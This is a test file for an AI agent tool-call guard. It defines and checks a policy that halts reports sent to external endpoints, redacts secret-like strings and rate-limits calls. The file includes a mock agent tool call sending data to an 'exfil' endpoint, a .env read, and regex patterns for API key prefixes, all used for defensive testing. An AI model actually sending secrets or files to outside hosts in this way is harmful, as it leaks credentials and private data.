import { describe, expect, test, beforeAll, afterAll } from "bun:test";
import { WardEngine, InMemoryRateLimiter, loadBifrostConfig, Runechain } from "@heimdall/core";
import { DriftDetector } from "@heimdall/core";
import { unlinkSync } from "fs";
import type { ToolCallContext } from "@heimdall/core";

const DEMO_POLICY = `
version: "1"
realm: "test-demo"
drift:
  action: WARN
  message: "Drift detected"
wards:
  - id: block-external-endpoints
    tool: "send_report"
    when:
      argument_matches:
        endpoint: "https?://(?!.*\\\\.internal).*"
    action: HALT
    message: "External endpoint blocked"
    severity: critical
  - id: redact-secrets
    tool: "send_report"
    when:
      argument_contains_pattern: "(sk-|AKIA|ghp_)"
    action: RESHAPE
    message: "Secrets redacted"
    severity: high
    reshape:
      data: "[REDACTED]"
  - id: rate-limit
    tool: "*"
    when:
      max_calls_per_minute: 30
    action: HALT
    message: "Rate limit"
    severity: medium
`;

describe("E2E Demo Scenario", () => {
  const DB_PATH = "/tmp/test-e2e-demo.sqlite";
  const KEY_DIR = "/tmp";
  const KEY_PATH = `${KEY_DIR}/heimdall.key`;
  const PUB_PATH = `${KEY_DIR}/heimdall.pub`;
  let config: ReturnType<typeof loadBifrostConfig>;
  let engine: InstanceType<typeof WardEngine>;
  let runechain: InstanceType<typeof Runechain>;

  beforeAll(() => {
    try { unlinkSync(DB_PATH); } catch { /* ok */ }
    try { unlinkSync(KEY_PATH); } catch { /* ok */ }
    try { unlinkSync(PUB_PATH); } catch { /* ok */ }
    config = loadBifrostConfig(DEMO_POLICY);
    const rateLimiter = new InMemoryRateLimiter();
    engine = new WardEngine(config, { rateLimitProvider: rateLimiter.getCallCount });
    runechain = new Runechain(DB_PATH);
  });

  afterAll(() => {
    runechain.close();
    try { unlinkSync(DB_PATH); } catch { /* ok */ }
    try { unlinkSync(KEY_PATH); } catch { /* ok */ }
    try { unlinkSync(PUB_PATH); } catch { /* ok */ }
  });

  test("list_files is PASS", () => {
    const ctx: ToolCallContext = {
      tool_name: "list_files",
      arguments: { directory: "/tmp/demo" },
      session_id: "test",
    };
    const result = engine.evaluate(ctx);
    expect(result.decision).toBe("PASS");
  });

  test("read_file(.env) is PASS", () => {
    const ctx: ToolCallContext = {
      tool_name: "read_file",
      arguments: { path: "/tmp/demo/.env" },
      session_id: "test",
    };
    const result = engine.evaluate(ctx);
    expect(result.decision).toBe("PASS");
  });

  test("send_report to external endpoint is HALT", () => {
    const ctx: ToolCallContext = {
      tool_name: "send_report",
      arguments: {
        endpoint: "https://external.example.com/exfil",
        data: "some data",
      },
      session_id: "test",
    };
    const result = engine.evaluate(ctx);
    expect(result.decision).toBe("HALT");
    expect(result.matched_wards).toContain("block-external-endpoints");
  });

  test("send_report to internal with secrets is RESHAPE", () => {
    const ctx: ToolCallContext = {
      tool_name: "send_report",
      arguments: {
        endpoint: "https://monitoring.internal/report",
        data: "API_KEY=sk-proj-abc123",
      },
      session_id: "test",
    };
    const result = engine.evaluate(ctx);
    expect(result.decision).toBe("RESHAPE");
    expect(result.matched_wards).toContain("redact-secrets");
    expect(result.reshaped_arguments?.data).toBe("[REDACTED]");
  });

  test("send_report to internal without secrets is PASS", () => {
    const ctx: ToolCallContext = {
      tool_name: "send_report",
      arguments: {
        endpoint: "https://monitoring.internal/report",
        data: "Project has 4 files, all clean.",
      },
      session_id: "test",
    };
    const result = engine.evaluate(ctx);
    expect(result.decision).toBe("PASS");
  });

  test("drift detector catches added tool", () => {
    const detector = new DriftDetector();
    const baseTools = [
      { name: "list_files", description: "List files", inputSchema: {} },
      { name: "read_file", description: "Read file", inputSchema: {} },
    ];
    const driftedTools = [
      ...baseTools,
      { name: "send_report", description: "Send report", inputSchema: {} },
    ];
    const changes = detector.diff(baseTools, driftedTools);
    expect(changes).toHaveLength(1);
    expect(changes[0].type).toBe("added");
    expect(changes[0].tool_name).toBe("send_report");
  });

  test("runechain inscribes and verifies", async () => {
    const ctx: ToolCallContext = {
      tool_name: "list_files",
      arguments: { directory: "/tmp" },
      session_id: "test",
    };
    const evaluation = engine.evaluate(ctx);
    const rune = await runechain.inscribeRune(ctx, evaluation);
    expect(rune.sequence).toBe(1);
    expect(rune.decision).toBe("PASS");

    const verification = await runechain.verifyChain();
    expect(verification.valid).toBe(true);
    expect(verification.total_runes).toBe(1);
  });
});
